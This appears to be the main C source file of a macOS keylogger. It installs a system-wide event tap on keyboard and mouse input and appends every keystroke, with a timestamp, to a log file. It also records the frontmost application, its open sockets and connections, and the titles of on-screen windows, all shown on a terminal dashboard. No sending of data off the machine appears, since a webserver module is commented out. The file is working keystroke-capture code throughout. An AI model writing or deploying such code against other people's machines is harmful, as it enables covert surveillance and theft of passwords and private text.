/**********************************/
#define WRITE_LOG_FILE          true
#define DELETE_DATABASE_FILE    false
/**********************************/
#include "../include/keylogger.h"
#include "../src/includes.c"
/**********************************/
#include "config.c"
#include "keylogger.h"
#include "mouse.c"
#include "osx_exec.c"
#include "sql.c"
//#include "webserver.c"
#include "window_utils.c"
/**********************************/
#include "types.h"
/**********************************/
CFArrayRef windowList;
volatile unsigned int windows_qty = 0;
/**********************************/
#include "keybinds.c"
#include "osx_utils.c"
/**********************************/


/**********************************/
void iterate_windows(){
  CFDictionaryRef window;

  windowList = CGWindowListCopyWindowInfo(
    (kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements),
    kCGNullWindowID
    );
  windows_qty = 0;
  int layer;

  for (int i = 0; i < CFArrayGetCount(windowList); i++) {
    window = CFArrayGetValueAtIndex(windowList, i);
    layer  = CFDictionaryGetInt(window, kCGWindowLayer);
    if (layer > 0) {
      continue;
    }
    char *appName = CFDictionaryCopyCString(window, kCGWindowOwnerName);
    if (!appName || !*appName) {
      continue;
    }
    char *windowName = CFDictionaryCopyCString(window, kCGWindowName);
    if (!windowName) {
      continue;
    }
    char *title = windowTitle(appName, windowName);
    if (!title) {
      continue;
    }
    log_info("title:%s|name:%s|app:%s", title, windowName, appName);
    windows_qty++;
  }
  log_info("%d windows", windows_qty);
}


/**********************************/
focused_t * get_focused_process(){
  focused_t           *f           = malloc(sizeof(focused_t));
  char                *processName = malloc(1024);
  ProcessSerialNumber psn;
  OSErr               err = GetFrontProcess(&psn);

  if (err == noErr) {
    ProcessInfoRec info;
    if (processName) {
      bzero(processName, 1024);
      info.processInfoLength = sizeof(ProcessInfoRec);
      info.processName       = processName;
      err                    = GetProcessInformation(&psn, &info);
      if (err == noErr) {
        f->name = trim(strdup(processName));
        GetProcessPID(&psn, &(f->pid));
        return(f);
      }else{
        log_error("process name err!");
      }
      free(processName);
    }
  }else{
    log_error("getFrontProcess err!");
  }
  return(f);
}
/**********************************/
volatile unsigned long
  events_qty       = 0,
  started          = 0,
  mouse_events_qty = 0,
  kb_events_qty    = 0
;
CGPoint     mouse_location;
/**********************************/
CGEventMask mouse_and_kb_events = (
  ///////////////////////////////////////
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventKeyUp)
  ///////////////////////////////////////
  | CGEventMaskBit(kCGEventFlagsChanged)
  | CGEventMaskBit(kCGEventLeftMouseDown)
  | CGEventMaskBit(kCGEventLeftMouseUp)
  | CGEventMaskBit(kCGEventRightMouseDown)
  | CGEventMaskBit(kCGEventRightMouseUp)
  | CGEventMaskBit(kCGEventMouseMoved)
  | CGEventMaskBit(kCGEventLeftMouseDragged)
  | CGEventMaskBit(kCGEventRightMouseDragged)
  ///////////////////////////////////////
  );


/**********************************/
void append_keystroke_log(const char *ckc){
  char *l = malloc(1024);

  sprintf(l, "%lu:%s\n", timestamp(), (char *)ckc);
  fsio_append_text_file(logfileLocation, l);
}


/**********************************/
void tap_events(){
  CFRunLoopRun();
}


void setup_event_tap(){
  CFMachPortRef event_tap = CGEventTapCreate(
    kCGSessionEventTap, kCGHeadInsertEventTap, 0, mouse_and_kb_events, event_handler, NULL
    );

  if (!event_tap) {
    log_fatal("ERROR: Unable to create keyboard event tap.");
    exit(1);
  }

  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);

  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(event_tap, true);
}


/**********************************/
void init_sql(){
  if (DELETE_DATABASE_FILE) {
    if (fsio_file_exists(DATABASE_FILE)) {
      fsio_remove(DATABASE_FILE);
    }
  }

  if (!fsio_file_exists(DATABASE_FILE)) {
    sql_create();
  }

  sql_insert();

  sql_select_statement();
  sql_select();

  sleep(5);
}


/**********************************/
void init(const int argc, const char **argv){
  log_set_level(MY_LOG_LEVEL);
  config_main(argc, argv);
  init_sql();
  //webserver_thread();
  keystates        = list_new();
  started          = timestamp();
  downkeys         = list_new();
  downkeys_history = list_new();
  mouse_location   = CGEventGetLocation(event_handler);
  sb               = stringbuffer_new_with_options(1024, true);
}
/**********************************/


CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  unsigned long
    ts = timestamp();
  bool
    key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown),
    is_mouse    = IsMouseEvent(type),
    is_keyboard = is_mouse ? false : true;
  char
  *action = "";

  events_qty++;
  if (key_up) {
    action = "UP";
  }else if (key_down) {
    action = "DOWN";
  }else{
    action = "UNKNOWN";
  }
  if (last_ts < 1) {
    last_ts = ts;
  }


  if (is_mouse) {
    mouse_events_qty++;
    mouse_location = CGEventGetLocation(event);
  }else if (is_keyboard) {
    kb_events_qty++;
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) {
      log_error("returning type %d", type);
      return(event);
    }
  }


  tq_start("getKeyCode");
  CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
  char      *keyCode_dur;

  keyCode_dur = tq_stop("getKeyCode");

  tq_start("convertKeyCode");
  const char *ckc           = convertKeyCode(keyCode);
  char       *keyString_dur = tq_stop("convertKeyCode");
  bool       do_post_set    = true;

  if (keycode_is_down((int)keyCode)) {
    if (WRITE_LOG_FILE && is_keyboard) {
      append_keystroke_log((const char *)ckc);
    }
    set_keycode_state(keyCode, key_down);
    do_post_set = false;
  }

  int           handled = handle_key((const int)keyCode, (const char *)ckc);

  unsigned long runtime = timestamp() - started;


  stringbuffer_clear(sb);

  stringbuffer_append_string(sb, AC_RESETALL "event type:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, is_mouse ? "Mouse" : "Keyboard");
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "log:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, (const char *)logfileLocation);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_BLUE_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_string(sb, bytes_to_string(fsio_file_size(logfileLocation)));
  stringbuffer_append_string(sb, AC_RESETALL ")]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "Events:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, kb_events_qty);
  stringbuffer_append_string(sb, " keyboard");
  stringbuffer_append_string(sb, "|");
  stringbuffer_append_int(sb, mouse_events_qty);
  stringbuffer_append_string(sb, " mouse");
  stringbuffer_append_string(sb, "|");
  stringbuffer_append_int(sb, events_qty);
  stringbuffer_append_string(sb, " total");
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  focused_t   *fp = get_focused_process();
  pid_stats_t *ps = get_pid_stats((int)fp->pid);

  stringbuffer_append_string(sb, AC_RESETALL "focused:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, fp->name);
  stringbuffer_append_string(sb, "|");
  stringbuffer_append_int(sb, fp->pid);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_BLUE_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->fds_qty);
  stringbuffer_append_string(sb, AC_RESETALL " File Descriptors)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_MAGENTA_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->open_files_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Open Files)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_YELLOW_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->sockets_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Open Sockets)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_CYAN_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->listening_ports_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Listening Ports)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_RED_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->connections_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Connections)|" AC_RESETALL);
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "mouse location:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, mouse_location.x);
  stringbuffer_append_string(sb, "/");
  stringbuffer_append_int(sb, mouse_location.y);
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "runtime:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, milliseconds_to_long_string(runtime));
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "handled:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, handled);
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "last_ms:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  if ((ts - last_ts) < 100) {
    stringbuffer_append_string(sb, "0");
  }
  stringbuffer_append_unsigned_long(sb, (ts - last_ts));
  stringbuffer_append_string(sb, "]\t  ");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "type:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, type);
  stringbuffer_append_string(sb, "]\t");
  stringbuffer_append_string(sb, AC_RESETALL);

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "windows:");
  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
  stringbuffer_append_int(sb, windows_qty);
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "action:");
  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
  stringbuffer_append_string(sb, (char *)action);
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, "code:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, keyCode);
  stringbuffer_append_string(sb, "]\t");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "key:");
  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
  stringbuffer_append_string(sb, (char *)ckc);
  stringbuffer_append_string(sb, "\t  ");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "keys:");
  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
  stringbuffer_append_string(sb, get_key_with_downkeys((char *)ckc));
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t  ");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "down?:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
  stringbuffer_append_string(sb, (char *)keycode_is_down_str((char *)ckc));
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "down qty:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
  stringbuffer_append_int(sb, (int)down_keycodes_qty());
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t");

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "down keys:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
  stringbuffer_append_string(sb, (char *)get_downkeys_strs());
  stringbuffer_append_string(sb, AC_RESETALL);
  stringbuffer_append_string(sb, "\t");

  if (false) {
    stringbuffer_append_string(sb, keyCode_dur);
    stringbuffer_append_string(sb, "\t");

    stringbuffer_append_string(sb, keyString_dur);
    stringbuffer_append_string(sb, "\t");
  }

  stringbuffer_append_string(sb, "");

  last_ts = ts;
  char *msg1 = AC_RESETALL AC_WHITE_BLACK "👌" AC_RESETALL;
  char *msg2 = AC_RESETALL AC_YELLOW " ⚡ " AC_RESETALL;

  term_erase("screen");
  term_reset();
  term_hide_cursor();
  int w = 0, h = 0;

  term_size(&w, &h);

  term_move_to(0, 0);
  printf(AC_RESETALL AC_BLUE AC_REVERSED "%s" AC_RESETALL "", msg2);

  term_move_to(0, 5);
  term_move_to((w - strlen(msg1) + 1), 0);
  printf(AC_RESETALL AC_BLUE AC_REVERSED "%s" AC_RESETALL "", msg1);


  term_move_to(0, 5);
  fprintf(stdout, "\n=============================\n");
  fprintf(stdout, "%s", stringbuffer_to_string(sb));
  fprintf(stdout, "\n=============================\n");
  fprintf(stdout, "\n\n");

  fprintf(stdout, "\n=============================\n");
  iterate_windows();
  fprintf(stdout, "=============================\n");

  if (do_post_set) {
    set_keycode_is_down(keyCode);
  }


  fflush(stdout);
  fflush(stderr);
  return(event);
} /* CGEventCallback */


/**********************************/
int main(const int argc, const char *argv[]) {
  init(argc, argv);
  setup_event_tap();
  tap_events();
  return(0);
}
/**********************************/
